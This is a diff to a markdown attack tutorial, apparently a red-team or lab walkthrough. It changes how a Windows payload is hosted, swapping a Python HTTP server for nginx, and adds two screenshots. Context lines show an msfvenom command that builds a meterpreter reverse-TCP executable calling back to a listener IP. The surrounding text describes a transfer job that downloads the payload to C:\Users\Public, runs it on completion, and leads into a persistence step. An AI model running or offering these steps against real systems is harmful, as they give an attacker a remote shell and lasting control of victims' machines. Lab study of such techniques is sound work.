@@ -38,10 +38,12 @@ On Kali Linux, open a terminal and generate a malicious executable:
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.10 LPORT=4444 -f exe > /tmp/payload.exe
 ```
-#### Step 3: Send Payload through Python HTTP Server
+#### Step 3: Send Payload through Nginx Server
 ```bash
 cd /tmp
-python3 -m http.server 8080
+sudo apt install nginx -y
+sudo cp payload.exe /var/www/html/
+sudo systemctl restart nginx
 ```
 Setting Up a Listener on Kali Linux
 
@@ -69,6 +71,9 @@ This command sequence:
 - Saves it to a writable directory (`C:\Users\Public\`)
 - Configures the job to execute the payload once the transfer is complete
 - Resumes the job to trigger execution
+
+![Image](https://github.com/user-attachments/assets/072fa4a7-450e-4eff-9249-08c5083ba574)
+![Image](https://github.com/user-attachments/assets/93cc2eb1-0b21-42b2-8c90-666403c5a4be)
 
 #### Step 3: Achieving Persistence
 
